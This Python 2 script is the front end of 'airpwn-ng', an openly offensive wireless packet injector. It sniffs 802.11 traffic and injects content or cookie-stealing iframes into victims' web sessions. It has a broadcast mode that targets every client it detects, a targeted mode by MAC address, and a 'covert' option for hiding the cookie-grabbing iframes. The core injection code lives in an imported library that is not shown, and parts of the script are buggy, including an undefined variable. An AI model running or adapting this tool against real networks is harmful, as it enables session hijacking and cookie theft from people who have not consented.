#! /usr/bin/env python

from threading import Thread
from Queue import Queue, Empty
from scapy.all import *
import subprocess,os,sys,argparse,signal
import lib.airpwn_ng as AIRPWN_NG

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



'''
Handle CTRL+C
'''
def signal_handler(signal, frame):
        print(bcolors.FAIL+'\n[!] Stopping injection and exiting airpwn-ng ...'+bcolors.ENDC)
        sys.exit(0)

#ADD GLOBAL SIGNAL HANDLER
signal.signal(signal.SIGINT, signal_handler)


'''
Load websites from a file to a List
object, ignoring lines starting with #
'''
def load_websites_targeted(websites_file):
	websites=[]
	f = open(websites_file,'r')
	for line in f.readlines():
		if (line.strip()[0]!="#"):
			websites.append(line.strip())
	f.close()
	return websites

'''
Main function.
This sets up VictimParameters, PacketHandler and
Victims (if any) and uses the library classes and functions
according to what arguments are provided
'''
def main(args):
	print "\n\nairpwn-ng - the new and improved 802.11 packet injector\n\n"

	#CHECK DEPENDENCIES
	try:
		p = subprocess.Popen(["packit"], stdout=subprocess.PIPE)
		out, err = p.communicate()
	except:
		print bcolors.WARNING+"[!] Packit was not found on your system, so injection for WEP/WPA encrypted networks will not work."+bcolors.ENDC
	m_iface = args.m
	i_iface = args.i

	#SEND OUT SOME WARNINGS
	if ("mon" in m_iface and m_iface!=i_iface):
		print bcolors.WARNING+"[!] It appears you are using a monitor mode interface as your monitoring input. If you are attacking open wireless networks, please use the same monitoring interface with -i for better performance."+bcolors.ENDC

	if ("mon" not in m_iface):
		print bcolors.WARNING+"[!] It appears your are trying to attack a WEP/WPA protected network. Please ensure -m is your dot11 tap interface and that -i is connected to the target AP."+bcolors.ENDC

	#CHECK FOR EXCLUDED HOSTS
	if (args.exclude_hosts is not None):
		EXCLUSION=1
		EXCLUDE_LIST=args.exclude_hosts
		
	injection=0
	#USE INJECT FILE
	if (args.injection is not None):
		#CHECK IF INJECTION FILE EXISTS
		try:
			f = open (args.injection,'r')
			f.close()
		except:
			print bcolors.FAIL+"[!] Selected injection file",args.injection,"does not exist."+bcolors.ENDC
			exit(1)
		print bcolors.OKGREEN+"[+] Loaded injection file",args.injection+bcolors.ENDC
		injection=1
	#USE WEBSITE LIST AND CREATE INJECTIONS ON THE FLY -- CHECK LIB/AIRPWN_NG.PY FOR MORE INFO
	else:
		#CHECK IF WEBSITES FILE EXISTS
		try:
			f = open(args.websites,'r')
			f.close()
		except:
			print bcolors.FAIL+"[!] Selected websites file",args.websites,"does not exist."+bcolors.ENDC
			exit(1)
		injection=0
		websites=load_websites_targeted(args.websites)
		for website in websites:
			print bcolors.OKGREEN+"[+] Loaded target website ",website+bcolors.ENDC

	# BROADCAST MODE
	if (args.t is None):
		print bcolors.WARNING+"[!] You are starting your attack in broadcast mode. This means you will inject packets into all clients you are able to detect. Use with caution."+bcolors.ENDC
		#FILE INJECTION
		if (injection==0):
			if (args.covert):
				vp=AIRPWN_NG.VictimParameters(websites=websites,covert=args.covert)
			else:
				vp=AIRPWN_NG.VictimParameters(websites=websites)
			if (args.exclude_hosts is None):
				ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp)
			else:
				ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp,excluded=args.exclude_hosts)
			if ("mon" in m_iface):
				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
				snif.threaded_sniff()
			else:
				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='')
				snif.threaded_sniff()
		#WEBSITES IFRAME INJECTION
		else:
			if (args.covert):
				vp=AIRPWN_NG.VictimParameters(inject_file=args.injection,covert=args.covert,highjack=highjacker)
			else:
				vp=AIRPWN_NG.VictimParameters(inject_file=args.injection)
			if (args.exclude_hosts is None):
				ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp)
			else:
				ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp,excluded=args.exclude_hosts)
			if ("mon" in m_iface):
				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
				snif.threaded_sniff()
			else:
				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='')
				snif.threaded_sniff()
	# TARGETED MODE
	else:
		if (len(args.t)==0):
			print bcolors.WARNING+"[!] You must specify at least one target MAC address with -t for targeted mode"
			exit(1)
		else:
			for target in args.t:
				print bcolors.OKGREEN+"[+] Adding target",target+bcolors.ENDC
		#WEBSITES IFRAME INJECTION
		if (injection==0):
			victims=[]
			if (args.covert):
				vp=AIRPWN_NG.VictimParameters(websites=websites,covert=args.covert)
			else:
				vp=AIRPWN_NG.VictimParameters(websites=websites)
			for victim in args.t:
				v1=AIRPWN_NG.Victim(mac=victim,victim_parameters=vp)
				victims.append(v1)
			if (args.exclude_hosts is None):
				ph=AIRPWN_NG.PacketHandler(i=i_iface,victims=victims)
			else:
				ph=AIRPWN_NG.PacketHandler(i=i_iface,victims=victims,excluded=args.exclude_hosts)
			if ("mon" in m_iface):
				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
				snif.threaded_sniff()
			else:
				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='')
				snif.threaded_sniff()			
		#FILE INJECTION
		else:
			victims=[]
			if (args.covert):
				vp=AIRPWN_NG.VictimParameters(inject_file=args.injection,covert=args.covert)
			else:
				vp=AIRPWN_NG.VictimParameters(inject_file=args.injection)
			for victim in args.t:
				v1=AIRPWN_NG.Victim(mac=victim,victim_parameters=vp)
				victims.append(v1)
			if (args.exclude_hosts is None):
				ph=AIRPWN_NG.PacketHandler(i=i_iface,victims=victims)
			else:
				ph=AIRPWN_NG.PacketHandler(i=i_iface,victims=victims,excluded=args.exclude_hosts)
			if ("mon" in m_iface):
				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
				snif.threaded_sniff()
			else:
				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420')
				snif.threaded_sniff()


if __name__ == '__main__':
	
        #ARGUMENT PARSING
        parser = argparse.ArgumentParser(description='airpwn-ng - the new and improved 802.11 packet injector')

        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('--injection',metavar='<filename>',help='File with your injection code')
        group.add_argument('--websites',metavar='<filename>',help='List of websites to sniff cookies from')

        parser.add_argument('-m',metavar='<interface>',required=True,help='Your monitor interface')
        parser.add_argument('-i',metavar='<interface>',required=True,help='Your injection interface')

        parser.add_argument('-t',nargs='*',metavar='<MAC address>',help='Target MAC addresses')

        parser.add_argument('--exclude-hosts',nargs='*',metavar='<host>',help='Space separated list of hosts/IP addresses to exclude from injection')

	#### NOT IMPLEMENTED YET
#        parser.add_argument('-o',metavar='<outfile>',help='Output File')

        parser.add_argument('-c',metavar='<count>',help='Number of cookies to grab per website on the --websites list')

        #### NOT IMPLEMENTED YET
        parser.add_argument('--covert',action='store_true',help='Hides cookie grabbing iframes inside the requested page')
        args = parser.parse_args()
        main(args)

